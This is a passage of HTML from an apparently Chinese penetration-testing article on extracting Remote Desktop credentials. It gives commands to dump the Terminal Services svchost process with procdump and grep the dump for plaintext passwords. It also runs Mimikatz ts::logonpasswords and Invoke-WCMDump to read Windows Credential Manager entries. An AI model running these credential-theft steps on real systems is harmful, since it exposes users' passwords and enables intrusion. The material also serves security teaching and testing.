src="图片/HACK学习呀_2021-08-03_内网渗透｜获取远程桌面连接记录与RDP凭据/17_vQcUBWmBJic4kJVMRARUEOpWJfwxTA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9LQkxd9qNoWlOJUt7seZEPjNgTWyKG4qJHQ4h3p44DoZpLrvQcUBWmBJic4kJVMRARUEOpWJfwxTA/640?wx_fmt=png'" data-type="png" data-w="861" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;height: auto !important;" title="null"  /><figcaption style="-webkit-tap-highlight-color: transparent;text-align: center;color: rgb(136, 136, 136);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 0.8em;">image-20210714012555696</figcaption></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">可以看到终端服务的 PID 为 4616。</p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">查询哪个任务加载了 rdpcorets.dll：</p><section class="code-snippet__github" style="margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0);white-space: normal;"><pre data-lang="cmd" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">tasklist </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">/</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">M</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">:</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">rdpcorets</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">dll</span></span></code></pre></section><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.18778801843317972" src="图片/HACK学习呀_2021-08-03_内网渗透｜获取远程桌面连接记录与RDP凭据/18_zwC0OMG4OHpmA8bSRlBibdibweEU7g.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9LQkxd9qNoWlOJUt7seZEPGtLicoGU0SGj17mFLiaDeJwGU3JbzwC0OMG4OHpmA8bSRlBibdibweEU7g/640?wx_fmt=png'" data-type="png" data-w="868" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;height: auto !important;" title="null"  /><figcaption style="-webkit-tap-highlight-color: transparent;text-align: center;color: rgb(136, 136, 136);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 0.8em;">image-20210714012656939</figcaption></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">进程 PID 还是 4616。</p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">查询终端服务的网络连接情况：</p><section class="code-snippet__github" style="margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0);white-space: normal;"><pre data-lang="powershell" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">netstat </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">nob </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">|</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Select</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">String</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">TermService</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Context</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">1</span></span></code></pre></section><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.27807486631016043" src="图片/HACK学习呀_2021-08-03_内网渗透｜获取远程桌面连接记录与RDP凭据/19_dL0TKUF3S88cODGOxoG2mssQnTOPxA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9LQkxd9qNoWlOJUt7seZEPqz3btwj5DFm5WJWI772YRVFJdL0TKUF3S88cODGOxoG2mssQnTOPxA/640?wx_fmt=png'" data-type="png" data-w="935" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;height: auto !important;" title="null"  /><figcaption style="-webkit-tap-highlight-color: transparent;text-align: center;color: rgb(136, 136, 136);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 0.8em;">image-20210714012745639</figcaption></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">PID 还是 4616。现在我们便可以确定，PID 为 4616 的进程托管了终端服务的连接。</p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">然后我们便可以通过 procdump.exe 将 PID 为 4616 的进程内存转储为 .dmp 了：</p><section class="code-snippet__github" style="margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0);white-space: normal;"><pre data-lang="cmd" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">procdump64</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">exe </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">ma </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">4616</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">accepteula C</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">:</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">\Users\Administrator\Desktop</span></span></code></pre></section><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.27904667328699106" src="图片/HACK学习呀_2021-08-03_内网渗透｜获取远程桌面连接记录与RDP凭据/20_oYTa8VwcTAWHeBWtuDicZII8QTWUAA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9LQkxd9qNoWlOJUt7seZEP8z1xYibQgzu9Tviamhzb0EfRCTKoYTa8VwcTAWHeBWtuDicZII8QTWUAA/640?wx_fmt=png'" data-type="png" data-w="1007" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;height: auto !important;" title="null"  /><figcaption style="-webkit-tap-highlight-color: transparent;text-align: center;color: rgb(136, 136, 136);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 0.8em;">image-20210714012519709</figcaption></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">转储成功后生成 svchost.exe_210714_012426.dmp 文件，大约 137 MB，RDP 的连接凭据就以明文的形式存储在这个文件里面，如下我们可以通过 strings 命令将明文凭据检索出来，密码位于用户名的下方：</p><section class="code-snippet__github" style="margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0);white-space: normal;"><pre data-lang="bash" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">strings </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">el svchost</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">exe_210</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">*.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">dmp </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">|</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> grep </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Whoami2021</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">C3</span></span></code></pre></section><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.283289817232376" src="图片/HACK学习呀_2021-08-03_内网渗透｜获取远程桌面连接记录与RDP凭据/21_uPajephajvxAEm0qricdF9mjtysmwg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9LQkxd9qNoWlOJUt7seZEPKkkKawchK4hfEYqsjDAQ6Gm4IuPajephajvxAEm0qricdF9mjtysmwg/640?wx_fmt=png'" data-type="png" data-w="766" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;height: auto !important;" title="null"  /><figcaption style="-webkit-tap-highlight-color: transparent;text-align: center;color: rgb(136, 136, 136);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 0.8em;">image-20210714013402425</figcaption></figure><h3 style="margin-top: 2em;margin-right: 8px;margin-bottom: 0.75em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.2;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.1em;font-weight: bold;padding-left: 8px;border-left: 3px solid rgb(15, 76, 129);">从已存在的 RDP 连接中导出</h3><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">Mimikatz 也支持从已存在的 RDP 连接中直接导出远程桌面连接凭据。命令执行如下：</p><section class="code-snippet__github" style="margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0);white-space: normal;"><pre data-lang="cmd" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">privilege</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">::</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">debug</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">ts</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">::</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">logonpasswords</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(150, 152, 150);"># mimikatz.exe "privilege::debug" "ts::logonpasswords"</span></span></code></pre></section><h3 style="margin-top: 2em;margin-right: 8px;margin-bottom: 0.75em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.2;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.1em;font-weight: bold;padding-left: 8px;border-left: 3px solid rgb(15, 76, 129);">使用 PowerShell 导出</h3><p style="-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;padding-left: 1em;list-style: circle;"><span style="margin: 0.2em 8px;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;text-indent: -1em;display: block;"><span style="margin-right: 10px;-webkit-tap-highlight-color: transparent;">•</span>项目地址：https://github.com/peewpw/Invoke-WCMDump</span></p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">Invoke-WCMDump.ps1 这个 PowerShell 脚本可以在 Windows 凭据管理器中枚举 Windows 凭据，然后提取有关每个凭据的可用信息，且无须管理员权限。</p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">使用方法如下：</p><section class="code-snippet__github" style="margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0);white-space: normal;"><pre data-lang="powershell" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">PS</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">&gt;</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Import</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Module</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">\Invoke</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">WCMDump</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">ps1</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">PS</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">&gt;</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Invoke</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">WCMDump</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">    </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Username</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">         </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">:</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> testusername</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">    </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Password</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">         </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">:</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> P@ssw0rd</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">!</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">    </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Target</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">           </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">:</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">TestApplication</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">    </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Description</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">      </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">:</span></span></code><code 